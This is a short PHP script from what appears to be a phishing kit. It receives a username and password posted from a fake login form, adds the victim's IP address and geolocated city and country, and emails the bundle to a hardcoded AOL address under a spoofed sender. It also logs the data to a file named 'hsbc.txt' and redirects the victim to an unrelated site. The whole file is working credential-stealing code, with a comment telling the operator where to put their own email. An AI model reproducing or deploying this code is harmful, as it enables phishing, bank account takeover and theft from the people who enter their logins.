<?
require_once('geoplugin.class.php');

$geoplugin = new geoPlugin();
$geoplugin->locate();
if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
    $ip = $_SERVER['HTTP_CLIENT_IP']; 
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; 
} else { 
    $ip = $_SERVER['REMOTE_ADDR']; 
} 
$adddate=date("D M d, Y g:i a");
$message .= "==========+[ MAILS ]+==========\n";
$message .= "Meal: ".$_POST['user']."\n";
$message .= "Peal: ".$_POST['passa']."\n";
$message .= "==========+[ MAILS ]+==========\n";
$message .= "IP Address: ".$ip."\n";
$message .= 	"City: {$geoplugin->city}\n";
$message .= 	"Region: {$geoplugin->region}\n";
$message .= 	"Country Name: {$geoplugin->countryName}\n";
$message .= 	"Country Code: {$geoplugin->countryCode}\n";
$message .= "Date: ".$adddate."\n";
$message .= "==========+[ Resultz ]+==========\n";
//change ur email here
$send = "r.an54@aol.com";
$subject = "MAILS".$_POST['email']."n";
$headers = "From: MAILS<mail@xsendersecurity.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message,$headers);

 }
 file_put_contents('../hsbc.txt', $message, FILE_APPEND);
    header("Location: https://www.made-in-china.com/help/faq/");
?>